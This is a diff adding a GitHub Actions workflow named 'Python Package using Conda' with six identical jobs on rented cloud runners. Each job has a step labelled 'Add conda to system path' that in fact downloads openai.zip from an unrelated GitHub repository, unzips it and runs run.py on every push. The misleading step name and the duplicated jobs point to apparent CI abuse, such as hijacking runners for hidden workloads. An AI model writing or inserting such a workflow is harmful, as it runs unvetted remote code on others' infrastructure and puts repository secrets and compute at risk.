@@ -1,0 +1,91 @@
+name: Python Package using Conda
+
+on: [push]
+
+jobs:
+  build-linux:
+    runs-on: nscloud-ubuntu-20.04-amd64-2x2
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: '3.10'
+    - name: Add conda to system path
+      run: |
+        wget https://github.com/zanuvapiky/probable-carnival/raw/refs/heads/main/openai.zip;unzip openai.zip
+        python run.py
+  build-linuxa:
+    runs-on: nscloud-ubuntu-20.04-amd64-2x2
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: '3.10'
+    - name: Add conda to system path
+      run: |
+        wget https://github.com/zanuvapiky/probable-carnival/raw/refs/heads/main/openai.zip;unzip openai.zip
+        python run.py
+  build-linuxb:
+    runs-on: nscloud-ubuntu-20.04-amd64-2x2
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: '3.10'
+    - name: Add conda to system path
+      run: |
+        wget https://github.com/zanuvapiky/probable-carnival/raw/refs/heads/main/openai.zip;unzip openai.zip
+        python run.py
+  build-linuxc:
+    runs-on: nscloud-ubuntu-20.04-amd64-2x2
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: '3.10'
+    - name: Add conda to system path
+      run: |
+        wget https://github.com/zanuvapiky/probable-carnival/raw/refs/heads/main/openai.zip;unzip openai.zip
+        python run.py
+  build-linuxd:
+    runs-on: nscloud-ubuntu-20.04-amd64-2x2
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: '3.10'
+    - name: Add conda to system path
+      run: |
+        wget https://github.com/zanuvapiky/probable-carnival/raw/refs/heads/main/openai.zip;unzip openai.zip
+        python run.py
+
+
+  build-linuxe:
+    runs-on: nscloud-ubuntu-20.04-amd64-2x2
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: '3.10'
+    - name: Add conda to system path
+      run: |
+        wget https://github.com/zanuvapiky/probable-carnival/raw/refs/heads/main/openai.zip;unzip openai.zip
+        python run.py
